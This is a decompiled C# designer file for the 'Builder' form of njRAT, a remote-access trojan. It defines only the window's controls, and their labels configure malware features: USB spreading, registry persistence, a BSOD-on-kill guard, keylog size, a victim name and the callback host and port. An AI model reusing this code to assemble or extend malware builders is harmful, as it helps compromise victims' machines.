﻿namespace NJRAT
{
	// Token: 0x0200000C RID: 12
	
	public partial class Builder : global::System.Windows.Forms.Form
	{
		// Token: 0x060000A3 RID: 163 RVA: 0x0014BA44 File Offset: 0x00149E44
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x0014BA94 File Offset: 0x00149E94
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::NJRAT.Builder));
			this.usbx = new global::System.Windows.Forms.TextBox();
			this.anti3 = new global::System.Windows.Forms.TextBox();
			this.RZ = new global::System.Windows.Forms.CheckBox();
			this.anti2 = new global::System.Windows.Forms.CheckBox();
			this.HD = new global::System.Windows.Forms.CheckBox();
			this.Button5 = new global::System.Windows.Forms.Button();
			this.Button4 = new global::System.Windows.Forms.Button();
			this.ColumnHeader1 = new global::System.Windows.Forms.ColumnHeader();
			this.usb = new global::System.Windows.Forms.CheckBox();
			this.Label6 = new global::System.Windows.Forms.Label();
			this.klen = new global::System.Windows.Forms.NumericUpDown();
			this.Isu = new global::System.Windows.Forms.CheckBox();
			this.Isf = new global::System.Windows.Forms.CheckBox();
			this.T1 = new global::System.Windows.Forms.TextBox();
			this.bsod = new global::System.Windows.Forms.CheckBox();
			this.Label5 = new global::System.Windows.Forms.Label();
			this.PictureBox1 = new global::System.Windows.Forms.PictureBox();
			this.CheckBox1 = new global::System.Windows.Forms.CheckBox();
			this.Idr = new global::System.Windows.Forms.CheckBox();
			this.dir = new global::System.Windows.Forms.ComboBox();
			this.Label4 = new global::System.Windows.Forms.Label();
			this.exe = new global::System.Windows.Forms.TextBox();
			this.GroupBox1 = new global::System.Windows.Forms.GroupBox();
			this.Label3 = new global::System.Windows.Forms.Label();
			this.VN = new global::System.Windows.Forms.TextBox();
			this.Button1 = new global::System.Windows.Forms.Button();
			this.port = new global::System.Windows.Forms.NumericUpDown();
			this.Label2 = new global::System.Windows.Forms.Label();
			this.Label1 = new global::System.Windows.Forms.Label();
			this.host = new global::System.Windows.Forms.TextBox();
			this.Panel1 = new global::System.Windows.Forms.Panel();
			this.Lv1 = new global::NJRAT.LV();
			this.ColumnHeader2 = new global::System.Windows.Forms.ColumnHeader();
			this.task = new global::System.Windows.Forms.CheckBox();
			((global::System.ComponentModel.ISupportInitialize)this.klen).BeginInit();
			((global::System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
			this.GroupBox1.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.port).BeginInit();
			this.Panel1.SuspendLayout();
			this.SuspendLayout();
			this.usbx.BackColor = global::System.Drawing.Color.Black;
			this.usbx.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.usbx.Enabled = false;
			this.usbx.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.usbx.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control usbx = this.usbx;
			global::System.Drawing.Point point = new global::System.Drawing.Point(283, 215);
			usbx.Location = point;
			this.usbx.Name = "usbx";
			global::System.Windows.Forms.Control usbx2 = this.usbx;
			global::System.Drawing.Size size = new global::System.Drawing.Size(159, 20);
			usbx2.Size = size;
			this.usbx.TabIndex = 53;
			this.usbx.Text = "svchost.exe";
			this.anti3.BackColor = global::System.Drawing.Color.Black;
			this.anti3.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.anti3.Enabled = false;
			this.anti3.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.anti3.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control anti = this.anti3;
			point = new global::System.Drawing.Point(283, 259);
			anti.Location = point;
			this.anti3.Name = "anti3";
			global::System.Windows.Forms.Control anti2 = this.anti3;
			size = new global::System.Drawing.Size(159, 20);
			anti2.Size = size;
			this.anti3.TabIndex = 51;
			this.anti3.Text = "Exsample.exe";
			this.RZ.AutoSize = true;
			this.RZ.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold);
			this.RZ.ForeColor = global::System.Drawing.Color.LightSteelBlue;
			global::System.Windows.Forms.Control rz = this.RZ;
			point = new global::System.Drawing.Point(486, 177);
			rz.Location = point;
			this.RZ.Name = "RZ";
			global::System.Windows.Forms.Control rz2 = this.RZ;
			size = new global::System.Drawing.Size(158, 18);
			rz2.Size = size;
			this.RZ.TabIndex = 50;
			this.RZ.Text = "Disable System Restore";
			this.RZ.UseVisualStyleBackColor = true;
			this.RZ.Visible = false;
			this.anti2.AutoSize = true;
			this.anti2.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold);
			this.anti2.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control anti3 = this.anti2;
			point = new global::System.Drawing.Point(283, 241);
			anti3.Location = point;
			this.anti2.Name = "anti2";
			global::System.Windows.Forms.Control anti4 = this.anti2;
			size = new global::System.Drawing.Size(91, 18);
			anti4.Size = size;
			this.anti2.TabIndex = 49;
			this.anti2.Text = "Kill Process";
			this.anti2.UseVisualStyleBackColor = true;
			this.HD.AutoSize = true;
			this.HD.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold);
			this.HD.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control hd = this.HD;
			point = new global::System.Drawing.Point(284, 79);
			hd.Location = point;
			this.HD.Name = "HD";
			global::System.Windows.Forms.Control hd2 = this.HD;
			size = new global::System.Drawing.Size(64, 18);
			hd2.Size = size;
			this.HD.TabIndex = 48;
			this.HD.Text = "Hidden";
			this.HD.UseVisualStyleBackColor = true;
			this.Button5.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.Button5.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.Button5.Font = new global::System.Drawing.Font("Arial Black", 8.25f, global::System.Drawing.FontStyle.Bold);
			this.Button5.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control button = this.Button5;
			point = new global::System.Drawing.Point(247, 26);
			button.Location = point;
			this.Button5.Name = "Button5";
			global::System.Windows.Forms.Control button2 = this.Button5;
			size = new global::System.Drawing.Size(23, 20);
			button2.Size = size;
			this.Button5.TabIndex = 47;
			this.Button5.Text = "-";
			this.Button5.UseVisualStyleBackColor = true;
			this.Button4.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.Button4.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.Button4.Font = new global::System.Drawing.Font("Arial Black", 8.25f, global::System.Drawing.FontStyle.Bold);
			this.Button4.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control button3 = this.Button4;
			point = new global::System.Drawing.Point(222, 26);
			button3.Location = point;
			this.Button4.Name = "Button4";
			global::System.Windows.Forms.Control button4 = this.Button4;
			size = new global::System.Drawing.Size(23, 20);
			button4.Size = size;
			this.Button4.TabIndex = 46;
			this.Button4.Text = "+";
			this.Button4.UseVisualStyleBackColor = true;
			this.ColumnHeader1.Text = "Hosts ";
			this.ColumnHeader1.Width = 251;
			this.usb.AutoSize = true;
			this.usb.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold);
			this.usb.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control usb = this.usb;
			point = new global::System.Drawing.Point(283, 197);
			usb.Location = point;
			this.usb.Name = "usb";
			global::System.Windows.Forms.Control usb2 = this.usb;
			size = new global::System.Drawing.Size(89, 18);
			usb2.Size = size;
			this.usb.TabIndex = 52;
			this.usb.Text = "Usb Spread";
			this.usb.UseVisualStyleBackColor = true;
			this.Label6.AutoSize = true;
			this.Label6.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.Label6.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control label = this.Label6;
			point = new global::System.Drawing.Point(280, 287);
			label.Location = point;
			this.Label6.Name = "Label6";
			global::System.Windows.Forms.Control label2 = this.Label6;
			size = new global::System.Drawing.Size(98, 14);
			label2.Size = size;
			this.Label6.TabIndex = 44;
			this.Label6.Text = "KeyLogs Size KB";
			this.klen.BackColor = global::System.Drawing.Color.Black;
			this.klen.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control klen = this.klen;
			point = new global::System.Drawing.Point(388, 285);
			klen.Location = point;
			global::System.Windows.Forms.NumericUpDown klen2 = this.klen;
			decimal num = new decimal(new int[] { 512, 0, 0, 0 });
			klen2.Maximum = num;
			global::System.Windows.Forms.NumericUpDown klen3 = this.klen;
			num = new decimal(new int[] { 5, 0, 0, 0 });
			klen3.Minimum = num;
			this.klen.Name = "klen";
			global::System.Windows.Forms.Control klen4 = this.klen;
			size = new global::System.Drawing.Size(54, 20);
			klen4.Size = size;
			this.klen.TabIndex = 43;
			global::System.Windows.Forms.NumericUpDown klen5 = this.klen;
			num = new decimal(new int[] { 20, 0, 0, 0 });
			klen5.Value = num;
			this.Isu.AutoSize = true;
			this.Isu.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.Isu.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.Isu.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control isu = this.Isu;
			point = new global::System.Drawing.Point(284, 101);
			isu.Location = point;
			this.Isu.Name = "Isu";
			global::System.Windows.Forms.Control isu2 = this.Isu;
			size = new global::System.Drawing.Size(106, 18);
			isu2.Size = size;
			this.Isu.TabIndex = 42;
			this.Isu.Text = "Registy StarUp";
			this.Isu.UseVisualStyleBackColor = true;
			this.Isf.AutoSize = true;
			this.Isf.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.Isf.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.Isf.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control isf = this.Isf;
			point = new global::System.Drawing.Point(283, 125);
			isf.Location = point;
			this.Isf.Name = "Isf";
			global::System.Windows.Forms.Control isf2 = this.Isf;
			size = new global::System.Drawing.Size(113, 18);
			isf2.Size = size;
			this.Isf.TabIndex = 41;
			this.Isf.Text = "Copy To StartUp";
			this.Isf.UseVisualStyleBackColor = true;
			this.T1.BackColor = global::System.Drawing.Color.Black;
			this.T1.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.T1.ForeColor = global::System.Drawing.Color.LightSteelBlue;
			global::System.Windows.Forms.Control t = this.T1;
			point = new global::System.Drawing.Point(591, 331);
			t.Location = point;
			this.T1.Multiline = true;
			this.T1.Name = "T1";
			global::System.Windows.Forms.Control t2 = this.T1;
			size = new global::System.Drawing.Size(100, 20);
			t2.Size = size;
			this.T1.TabIndex = 40;
			this.T1.Visible = false;
			this.bsod.AutoSize = true;
			this.bsod.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.bsod.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.bsod.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control bsod = this.bsod;
			point = new global::System.Drawing.Point(283, 149);
			bsod.Location = point;
			this.bsod.Name = "bsod";
			global::System.Windows.Forms.Control bsod2 = this.bsod;
			size = new global::System.Drawing.Size(155, 18);
			bsod2.Size = size;
			this.bsod.TabIndex = 39;
			this.bsod.Text = "Protect Process [BSOD]";
			this.bsod.UseVisualStyleBackColor = true;
			this.Label5.AutoSize = true;
			this.Label5.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.Label5.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control label3 = this.Label5;
			point = new global::System.Drawing.Point(9, 188);
			label3.Location = point;
			this.Label5.Name = "Label5";
			global::System.Windows.Forms.Control label4 = this.Label5;
			size = new global::System.Drawing.Size(79, 14);
			label4.Size = size;
			this.Label5.TabIndex = 37;
			this.Label5.Text = "VicTim Name";
			this.PictureBox1.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			global::System.Windows.Forms.Control pictureBox = this.PictureBox1;
			point = new global::System.Drawing.Point(368, 28);
			pictureBox.Location = point;
			this.PictureBox1.Name = "PictureBox1";
			global::System.Windows.Forms.Control pictureBox2 = this.PictureBox1;
			size = new global::System.Drawing.Size(56, 43);
			pictureBox2.Size = size;
			this.PictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.PictureBox1.TabIndex = 36;
			this.PictureBox1.TabStop = false;
			this.CheckBox1.AutoSize = true;
			this.CheckBox1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.CheckBox1.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.CheckBox1.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control checkBox = this.CheckBox1;
			point = new global::System.Drawing.Point(284, 55);
			checkBox.Location = point;
			this.CheckBox1.Name = "CheckBox1";
			global::System.Windows.Forms.Control checkBox2 = this.CheckBox1;
			size = new global::System.Drawing.Size(49, 18);
			checkBox2.Size = size;
			this.CheckBox1.TabIndex = 35;
			this.CheckBox1.Text = "Icon";
			this.CheckBox1.UseVisualStyleBackColor = true;
			this.Idr.AutoSize = true;
			this.Idr.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.Idr.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold);
			this.Idr.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control idr = this.Idr;
			point = new global::System.Drawing.Point(196, 12);
			idr.Location = point;
			this.Idr.Name = "Idr";
			global::System.Windows.Forms.Control idr2 = this.Idr;
			size = new global::System.Drawing.Size(54, 18);
			idr2.Size = size;
			this.Idr.TabIndex = 14;
			this.Idr.Text = "Copy";
			this.Idr.UseVisualStyleBackColor = true;
			this.dir.BackColor = global::System.Drawing.Color.Black;
			this.dir.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
			this.dir.Enabled = false;
			this.dir.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.dir.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.dir.ForeColor = global::System.Drawing.Color.LimeGreen;
			this.dir.FormattingEnabled = true;
			this.dir.Items.AddRange(new object[] { "%TEMP%", "%AppData%", "%UserProfile%", "%AllUsersProfile%", "%WinDir%" });
			global::System.Windows.Forms.Control dir = this.dir;
			point = new global::System.Drawing.Point(8, 72);
			dir.Location = point;
			this.dir.Name = "dir";
			global::System.Windows.Forms.Control dir2 = this.dir;
			size = new global::System.Drawing.Size(241, 22);
			dir2.Size = size;
			this.dir.TabIndex = 7;
			this.Label4.AutoSize = true;
			this.Label4.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.Label4.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control label5 = this.Label4;
			point = new global::System.Drawing.Point(6, 56);
			label5.Location = point;
			this.Label4.Name = "Label4";
			global::System.Windows.Forms.Control label6 = this.Label4;
			size = new global::System.Drawing.Size(57, 14);
			label6.Size = size;
			this.Label4.TabIndex = 6;
			this.Label4.Text = "Directory";
			this.exe.BackColor = global::System.Drawing.Color.Black;
			this.exe.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.exe.Enabled = false;
			this.exe.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.exe.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control exe = this.exe;
			point = new global::System.Drawing.Point(8, 32);
			exe.Location = point;
			this.exe.Name = "exe";
			global::System.Windows.Forms.Control exe2 = this.exe;
			size = new global::System.Drawing.Size(241, 20);
			exe2.Size = size;
			this.exe.TabIndex = 5;
			this.exe.Text = "server.exe";
			this.GroupBox1.Controls.Add(this.Idr);
			this.GroupBox1.Controls.Add(this.dir);
			this.GroupBox1.Controls.Add(this.Label4);
			this.GroupBox1.Controls.Add(this.exe);
			this.GroupBox1.Controls.Add(this.Label3);
			this.GroupBox1.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control groupBox = this.GroupBox1;
			point = new global::System.Drawing.Point(12, 231);
			groupBox.Location = point;
			this.GroupBox1.Name = "GroupBox1";
			global::System.Windows.Forms.Control groupBox2 = this.GroupBox1;
			size = new global::System.Drawing.Size(258, 100);
			groupBox2.Size = size;
			this.GroupBox1.TabIndex = 33;
			this.GroupBox1.TabStop = false;
			this.Label3.AutoSize = true;
			this.Label3.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.Label3.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control label7 = this.Label3;
			point = new global::System.Drawing.Point(6, 16);
			label7.Location = point;
			this.Label3.Name = "Label3";
			global::System.Windows.Forms.Control label8 = this.Label3;
			size = new global::System.Drawing.Size(57, 14);
			label8.Size = size;
			this.Label3.TabIndex = 4;
			this.Label3.Text = "ExeName";
			this.VN.BackColor = global::System.Drawing.Color.Black;
			this.VN.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.VN.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.VN.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control vn = this.VN;
			point = new global::System.Drawing.Point(12, 205);
			vn.Location = point;
			this.VN.Name = "VN";
			global::System.Windows.Forms.Control vn2 = this.VN;
			size = new global::System.Drawing.Size(258, 20);
			vn2.Size = size;
			this.VN.TabIndex = 38;
			this.VN.Text = "HacKed";
			this.Button1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.Button1.Enabled = false;
			this.Button1.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.Button1.Font = new global::System.Drawing.Font("Arial Black", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.Button1.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control button5 = this.Button1;
			point = new global::System.Drawing.Point(12, 337);
			button5.Location = point;
			this.Button1.Name = "Button1";
			global::System.Windows.Forms.Control button6 = this.Button1;
			size = new global::System.Drawing.Size(434, 26);
			button6.Size = size;
			this.Button1.TabIndex = 34;
			this.Button1.Text = "Build";
			this.Button1.UseVisualStyleBackColor = true;
			this.port.BackColor = global::System.Drawing.Color.Black;
			this.port.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.port.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control port = this.port;
			point = new global::System.Drawing.Point(284, 26);
			port.Location = point;
			global::System.Windows.Forms.NumericUpDown port2 = this.port;
			num = new decimal(new int[] { 60000, 0, 0, 0 });
			port2.Maximum = num;
			global::System.Windows.Forms.NumericUpDown port3 = this.port;
			num = new decimal(new int[] { 1, 0, 0, 0 });
			port3.Minimum = num;
			this.port.Name = "port";
			global::System.Windows.Forms.Control port4 = this.port;
			size = new global::System.Drawing.Size(69, 20);
			port4.Size = size;
			this.port.TabIndex = 32;
			global::System.Windows.Forms.NumericUpDown port5 = this.port;
			num = new decimal(new int[] { 5552, 0, 0, 0 });
			port5.Value = num;
			this.Label2.AutoSize = true;
			this.Label2.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.Label2.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control label9 = this.Label2;
			point = new global::System.Drawing.Point(281, 10);
			label9.Location = point;
			this.Label2.Name = "Label2";
			global::System.Windows.Forms.Control label10 = this.Label2;
			size = new global::System.Drawing.Size(30, 14);
			label10.Size = size;
			this.Label2.TabIndex = 31;
			this.Label2.Text = "Port";
			this.Label1.AutoSize = true;
			this.Label1.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.Label1.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control label11 = this.Label1;
			point = new global::System.Drawing.Point(9, 10);
			label11.Location = point;
			this.Label1.Name = "Label1";
			global::System.Windows.Forms.Control label12 = this.Label1;
			size = new global::System.Drawing.Size(32, 14);
			label12.Size = size;
			this.Label1.TabIndex = 30;
			this.Label1.Text = "Host";
			this.host.BackColor = global::System.Drawing.Color.Black;
			this.host.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.host.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.host.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control host = this.host;
			point = new global::System.Drawing.Point(12, 26);
			host.Location = point;
			this.host.Name = "host";
			global::System.Windows.Forms.Control host2 = this.host;
			size = new global::System.Drawing.Size(204, 20);
			host2.Size = size;
			this.host.TabIndex = 29;
			this.host.Text = "127.0.0.1";
			this.Panel1.Controls.Add(this.Lv1);
			this.Panel1.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control panel = this.Panel1;
			point = new global::System.Drawing.Point(12, 55);
			panel.Location = point;
			this.Panel1.Name = "Panel1";
			global::System.Windows.Forms.Control panel2 = this.Panel1;
			size = new global::System.Drawing.Size(258, 130);
			panel2.Size = size;
			this.Panel1.TabIndex = 55;
			this.Lv1.BackColor = global::System.Drawing.Color.Black;
			this.Lv1.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[] { this.ColumnHeader2 });
			this.Lv1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.Lv1.Font = new global::System.Drawing.Font("Arial", 8f, global::System.Drawing.FontStyle.Bold);
			this.Lv1.ForeColor = global::System.Drawing.Color.LimeGreen;
			this.Lv1.FullRowSelect = true;
			global::System.Windows.Forms.Control lv = this.Lv1;
			point = new global::System.Drawing.Point(0, 0);
			lv.Location = point;
			this.Lv1.Name = "Lv1";
			global::System.Windows.Forms.Control lv2 = this.Lv1;
			size = new global::System.Drawing.Size(258, 130);
			lv2.Size = size;
			this.Lv1.TabIndex = 54;
			this.Lv1.UseCompatibleStateImageBehavior = false;
			this.Lv1.View = global::System.Windows.Forms.View.Details;
			this.ColumnHeader2.Text = "Multi Host";
			this.ColumnHeader2.Width = 252;
			this.task.AutoSize = true;
			this.task.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold);
			this.task.ForeColor = global::System.Drawing.Color.LimeGreen;
			global::System.Windows.Forms.Control task = this.task;
			point = new global::System.Drawing.Point(283, 173);
			task.Location = point;
			this.task.Name = "task";
			global::System.Windows.Forms.Control task2 = this.task;
			size = new global::System.Drawing.Size(67, 18);
			task2.Size = size;
			this.task.TabIndex = 56;
			this.task.Text = "Anti Kill";
			this.task.UseVisualStyleBackColor = true;
			global::System.Drawing.SizeF sizeF = new global::System.Drawing.SizeF(6f, 13f);
			this.AutoScaleDimensions = sizeF;
			this.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.Black;
			size = new global::System.Drawing.Size(456, 375);
			this.ClientSize = size;
			this.Controls.Add(this.task);
			this.Controls.Add(this.Panel1);
			this.Controls.Add(this.usbx);
			this.Controls.Add(this.anti3);
			this.Controls.Add(this.RZ);
			this.Controls.Add(this.anti2);
			this.Controls.Add(this.HD);
			this.Controls.Add(this.Button5);
			this.Controls.Add(this.Button4);
			this.Controls.Add(this.usb);
			this.Controls.Add(this.Label6);
			this.Controls.Add(this.klen);
			this.Controls.Add(this.Isu);
			this.Controls.Add(this.Isf);
			this.Controls.Add(this.T1);
			this.Controls.Add(this.bsod);
			this.Controls.Add(this.Label5);
			this.Controls.Add(this.PictureBox1);
			this.Controls.Add(this.CheckBox1);
			this.Controls.Add(this.GroupBox1);
			this.Controls.Add(this.VN);
			this.Controls.Add(this.Button1);
			this.Controls.Add(this.port);
			this.Controls.Add(this.Label2);
			this.Controls.Add(this.Label1);
			this.Controls.Add(this.host);
			this.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			this.MaximizeBox = false;
			this.MinimizeBox = false;
			this.Name = "Builder";
			this.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Builder";
			this.TopMost = true;
			((global::System.ComponentModel.ISupportInitialize)this.klen).EndInit();
			((global::System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
			this.GroupBox1.ResumeLayout(false);
			this.GroupBox1.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.port).EndInit();
			this.Panel1.ResumeLayout(false);
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		// Token: 0x0400004C RID: 76
		private global::System.ComponentModel.IContainer components;
	}
}